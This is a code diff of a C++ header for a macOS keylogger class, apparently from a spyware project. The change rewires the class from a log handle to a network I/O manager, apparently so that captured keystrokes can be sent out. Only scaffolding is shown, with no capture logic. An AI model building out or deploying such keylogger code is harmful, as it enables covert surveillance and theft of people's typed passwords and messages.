@@ -7,21 +7,21 @@
 
 #include <memory>
 #include <utils/Config.hpp>
+#include <Network/IOManager.hpp>
 #include "KeyLogger.hpp"
 
-#define OSX_LOG utl::LightMagenta <<"{'OSXKeyLogger'}"  << utl::Reset
+#define OSX_LOG "{'OSXKeyLogger'}"
 
 namespace spi
 {
     class OSXKeyLogger : public KeyLogger
     {
     public:
-        explicit OSXKeyLogger(LogHandle &logHandle) noexcept : _logHandle(logHandle)
-        {
-        };
+        explicit OSXKeyLogger(net::IOManager &service) : _service(service)
+        {}
+
         ~OSXKeyLogger() override = default;
 
-    public:
         void setup() override
         {
             _log(lg::Info) << OSX_LOG << " successfully initialized." << std::endl;
@@ -41,15 +41,15 @@ namespace spi
         }
 
     private:
-        LogHandle &_logHandle;
+        spi::net::IOManager &_service;
     };
 }
 
 namespace spi::details
 {
-    static always_inline KeyLogPtr createKeyLogger()
+    static always_inline KeyLogPtr createKeyLogger(net::IOManager &service)
     {
-        return std::make_unique<OSXKeyLogger>();
+      return std::make_unique<OSXKeyLogger>(service);
     }
 }
 
